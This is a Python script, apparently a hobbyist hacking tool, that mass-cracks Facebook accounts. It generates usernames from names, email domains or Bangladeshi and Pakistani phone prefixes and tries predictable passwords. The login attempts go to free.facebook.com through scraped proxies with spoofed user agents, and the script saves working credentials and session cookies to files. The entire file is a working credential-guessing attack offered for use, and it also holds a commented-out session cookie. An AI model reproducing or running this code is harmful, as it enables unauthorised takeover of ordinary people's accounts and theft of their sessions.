#𝙴𝙷𝙲 𝙲𝚈𝙱𝙴𝚁 𝟿𝟿
#TOUFIK 𝙷𝙾𝚂𝚂𝚂𝙰𝙸𝙽
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
logo = ("""
 \033[37;1m𝙴𝙷𝙲 𝙲𝚈𝙱𝙴𝚁 𝙴𝙼𝚁𝙰𝙽 𝙵𝚁𝙾𝙼 𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷
 \033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 \033[34;1m888888b.   \033[38;5;46m888b    888  \033[33;1m.d8888b.  
 \033[34;1m888  "88b  \033[38;5;46m8888b   888 \033[33;1md88P  Y88b 
 \033[34;1m888  .88P  \033[38;5;46m88888b  888 \033[33;1m888    888 
 \033[34;1m8888888K.  \033[38;5;46m888Y88b 888 \033[33;1m888        
 \033[34;1m888  "Y88b \033[38;5;46m888 Y88b888 \033[33;1m888  88888 
 \033[34;1m888    888 \033[38;5;46m888  Y88888 \033[33;1m888    888 
 \033[34;1m888   d88P \033[38;5;46m888   Y8888 \033[33;1mY88b  d88P 
 \033[34;1m8888888P"  \033[38;5;46m888    Y888  \033[33;1m"Y8888P88                                                                                                      
 \033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\033[38;5;46m[🦋] 𝚃𝙾𝙾𝙻𝚂 private 
\033[38;5;46m[🦋] 𝙰𝚄𝚃𝙷𝙾𝚁 Toufik
\033[38;5;46m[🦋] 𝙶𝙸𝚃𝙷𝚄𝙱 toufik-404
\033[38;5;46m[🦋] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 Toufik Hossain
\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print("\033[38;5;46m[𝟷]𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝙴𝙼𝙰𝙸𝙻 𝙸𝙳 𝙲𝙻𝙾𝙽𝙸𝙽𝙶[𝚆𝙾𝚁𝙺𝙸𝙽𝙶] ")
        print("\033[38;5;46m[𝟸]𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝙲𝙻𝙾𝙽𝙸𝙽𝙶[𝙱𝙴𝚂𝚃]")
        print("\033[38;5;46m[𝟹]𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝚅𝙸𝙿 𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙸𝙽𝙶[𝙵𝙸𝚁𝙴]")
        print("\033[38;5;46m[𝟶]𝙴𝚇𝙸𝚃")
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        Toufik =input(" [√] \033[38;5;46m𝙲𝙷𝙾𝙾𝚂𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝟷 𝙱𝙰𝚂𝚃: ")
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        if Toufik in ["1", "01"]:
            v1()
        if Toufik in ["2", "02"]:
            v2()
        if Toufik in ["3","03"]:
            v3()
        if Toufik in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kode = input(' [☘️]\033[38;5;46m𝚃𝙴𝚁𝙶𝙴𝚃 𝙵𝙸𝚁𝚂𝚃 𝙽𝙰𝙼𝙴: ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kodex = input(' [☘️]\033[38;5;46m𝚃𝙴𝚁𝙶𝙴𝚃 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴:  ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(' [☘️] \033[38;5;46mexample 𝙳𝙾𝙰𝙼𝙸𝙽:@gmail.com, @yahoo.com ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    doamin = input(' [☘️]\033[38;5;46m𝙸𝙽𝙿𝚄𝙸𝚃 𝙳𝙾𝙰𝙼𝙸𝙽: ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    limit = int(input('[☘️]\033[38;5;46m𝙸𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃: '))
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(' [☘️]\033[38;5;46m𝚃𝙾𝚃𝙴𝙻 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝙸𝙳:'+tl)
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(f"\033[1;97m [☘️]𝑻𝑬𝑹𝑮𝑬𝑻 𝑫𝑶𝑨𝑴𝑰𝑵:\033[1;92m {doamin}")
        print(' \033[1;97m[☘️]𝑻𝑯𝑬 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ')
        print(' [☘️]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝙏𝙤𝙪𝙛𝙞𝙠')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(' [☘️]\033[38;5;46m𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫')
    print(' [☘️]\033[38;5;46𝑴𝑳𝑫𝑺 𝑺𝑨𝑽𝑬𝑫 𝑰𝑵 𝑶𝑲.𝑻𝑿𝑻.𝑪𝑷.𝑻𝑿𝑻')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
def v2():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kode = input('  [☘️]\033[38;5;46m𝚃𝙴𝚁𝙶𝙴𝚃 𝙵𝙸𝚁𝚂𝚃 𝙽𝙰𝙼𝙴: ')
    kodex = input('[☘️\033[38;5;46m]𝚃𝙴𝚁𝙶𝙴𝚃 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴:  ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    doamin = '.'
    limit = int(input('[☘️]\033[38;5;46m𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(' [☘️]\033[38;5;46m𝐓𝐎𝐓𝐀𝐋 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐈𝐃:'+tl)
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(f"[☘️]033[38;5;46m𝐓𝐄𝐑𝐆𝐄𝐓 𝐃𝐎𝐀𝐌𝐈𝐍:𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐂𝐋𝐎𝐍𝐈𝐍𝐆(,𝐍𝐀𝐌𝐄)")
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print('[☘️]033[38;5;46m𝑻𝑯𝑬 𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑺𝑻𝑨𝑹𝑻𝑬𝑫')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print('[☘️]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝙏𝙤𝙪𝙛𝙞𝙠')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(' [☘️]\033[38;5;46m𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨?? 𝑩𝑬𝑬𝑵 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫')
    print(' [☘️]\033[38;5;46m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫 𝑺𝑨𝑽𝑬𝑫 𝑰𝑵 𝑶𝑲 𝑻𝑿𝑻 𝑪𝑷 𝑻𝑿𝑻')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
def v3():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print("\033[38;5;46m𝙱𝙳 𝐒𝐈𝐌 𝙲𝙾𝙳𝙴+𝟾𝟾𝟶𝟷𝟽,+𝟾𝟾𝟶𝟷𝟾,+𝟾𝟾𝟶𝟷𝟿,+𝟾𝟾𝟶𝟷𝟺,+𝟾𝟾𝟶𝟷𝟹")
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print("\033[1;32m𝙿𝙰𝙺 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴+𝟿𝟸𝟹𝟶𝟷,+𝟿𝟸𝟹𝟶𝟸,+𝟿𝟸𝟹𝟶𝟹,+𝟿𝟸𝟹𝟶𝟻")
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print("\033[38;5;46m𝙽𝙾𝚃𝙴:𝚃𝙷𝙾𝚂𝙴 𝚆𝙷𝙾 𝚂𝚃𝙰𝚈 𝙸𝙽 𝚃𝙷𝙴𝙸𝚁 𝙸𝙽 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 𝚃𝙷𝙴𝚈 𝙲𝙰𝙽 𝙶𝙸𝚅𝙴 𝚃𝙷𝙴𝙸𝚁 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝚃𝙾 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙳𝙲𝙻𝙾𝙽𝙴")
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kode = input(' [☘️]\033[38;5;46m𝙴𝙽𝚃𝙴𝚁 𝚂𝙸𝙼𝙴 𝙲𝙾𝙳𝙴: ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    doamin = '[☘️]\033[38;5;46m𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝚅𝙸𝙿 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 (𝙱𝙳 𝙽𝚄𝙼𝙱𝙴𝚁) '
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    limit = int(input('[☘️]\033[38;5;46m𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃: '))
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(' \033[1;33m[☘️]\033[38;5;46m𝑻𝑶𝑻𝑨𝑳 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫:'+tl)
        print(f"\033[1;33m[☘️]\033[38;5;46m𝒀𝑶𝑼𝑹 𝑻𝑬𝑹𝑮𝑬𝑻 𝑪𝑹𝑨𝑪𝑲 𝑴𝑬𝑵𝑼 {doamin}")
        print(' \033[1;33m[☘️]\033[38;5;46m𝑻𝑯𝑬 𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑺𝑻𝑨𝑹𝑻𝑬𝑫')
        print(' \033[1;33m[☘️]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝙏𝙤𝙪𝙛𝙞𝙠')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(' [☘️] 033[38;5;46m𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫')
    print(' [☘️] \033[38;5;46m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫 𝑺𝑨𝑽𝑬𝑫 𝑰𝑵 𝑶𝑲 𝑻𝑿𝑻 𝑪𝑷 𝑻𝑿𝑻')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mEMRAN\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
   "method": 'GET',
   'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
   "scheme": 'https',
   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=P3fjZa1rpHVzMAYZc0E6c5Cy; sb=P3fjZV_g4bLAk_iRJcJjdR-F; ps_l=0; ps_n=0; locale=en_US; vpd=v1%3B708x360x2; wl_cbv=v2%3Bclient_version%3A2424%3Btimestamp%3A1709427373; m_pixel_ratio=2; wd=360x708; fr=0eM2KrJU5518GDrNC.AWX1zRiTlGdJI1Rp9Bk6Ggr1ktM.Bl43c_..AAA.0.0.Bl48r5.AWV3an7GOH4',
    'dpr': '2',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X657B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[TOUFIK-OK☘️] {uid}|{ps}")
                print(f"\n[COOKIE☘️] : {coki}")
                open('/sdcard/TOUFIK/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[TOUFIK-CP☘️] {uid}|{ps}")
                open('/sdcard/TOUFIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[TOUFIK-EHC☘️] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
